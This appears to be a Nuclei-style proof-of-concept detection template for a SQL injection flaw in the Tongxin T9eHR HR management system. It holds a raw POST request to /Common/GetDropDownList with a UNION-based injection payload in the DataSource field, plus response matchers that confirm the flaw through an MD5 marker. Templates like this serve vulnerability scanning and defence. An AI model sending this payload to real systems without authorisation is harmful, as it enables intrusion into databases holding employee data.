id: poc-yaml-tongxine-t9ehr-getdropdownlist-sqli
info:
  name: 同鑫T9eHR信息化管理系统 GetDropDownList SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    同鑫T9eHR信息化管理系统存在SQL注入漏洞，通过精心构造的POST请求可以触发漏洞。

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /Common/GetDropDownList HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        DataSource=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),0x7e),NULL,NULL,NULL,NULL,NULL,NULL-- SWgM&Items=1&defaultVal=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "\"success\":true"
          - "Key"
      - type: word
        part: header
        words:
          - "application/json"
